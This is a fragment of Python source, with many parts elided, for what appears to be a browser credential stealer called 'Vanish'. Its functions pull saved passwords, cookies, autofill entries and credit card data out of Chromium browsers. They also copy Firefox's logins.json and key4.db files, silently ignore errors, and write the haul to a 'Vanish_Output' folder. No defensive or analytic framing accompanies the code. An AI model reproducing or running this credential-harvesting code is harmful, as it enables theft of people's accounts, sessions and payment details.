...
def write_to_output(base_dir: str, sub_path: str, content: str):
    if content.strip():
...
def process_chromium_browser(browser_name, config, master_key, output_dir):
    user_profile = os.environ['USERPROFILE']
            ...
            if tmp_db:
                try:
                    ...
                    if passwords_content.strip():
                        write_to_output(output_dir, prefix + "passwords.txt", passwords_content)
            ...
            if tmp_db:
                try:
                    ...
                    if cookies_content.strip():
                        write_to_output(output_dir, prefix + "cookies.txt", cookies_content)
        ...
        if webdata_db.exists():
            ...
            if tmp_db:
                try:
                    ...
                    if autofill_content:
                        write_to_output(output_dir, prefix + "auto_fills.txt", autofill_content)
                    if credit_cards_content:
                        write_to_output(output_dir, prefix + "credit_cards.txt", credit_cards_content)
...
def process_firefox_browser(browser_name, config, output_dir):
    user_profile = os.environ['USERPROFILE']
    ...
    for profile_dir in profile_dirs:
        ...
        if cookies_db.exists():
            try:
                ...
                con.close()
                if cookies_content: write_to_output(output_dir, prefix + "cookies.txt", cookies_content)
            except: pass
        ...
        if logins_json.exists(): 
            try:
                raw_path = os.path.join(output_dir, prefix + "raw/logins.json")
                os.makedirs(os.path.dirname(raw_path), exist_ok=True)
                shutil.copy2(logins_json, raw_path)
            except: pass
        if (profile_dir / "key4.db").exists():
            try:
                raw_path = os.path.join(output_dir, prefix + "raw/key4.db")
                os.makedirs(os.path.dirname(raw_path), exist_ok=True)
                shutil.copy2(profile_dir / "key4.db", raw_path)
            except: pass
...
def main():
    ...
    try:
        ...
        out = args.output_path if args.output_path else os.path.join(desktop, "Vanish_Output")
        
        # Ensure 'out' is a folder name and doesn't explicitly look like a zip path
        if out.endswith(".zip"):
            out = out[:-4]
        if out.endswith("output"): # Fallback cleanup if something passed 'output'
            out = out.replace("output", "Vanish_Output")
            
        # Temizlik: Eğer varsa eski dosyaları/klasörleri sil (Sadece 1 tane olsun)
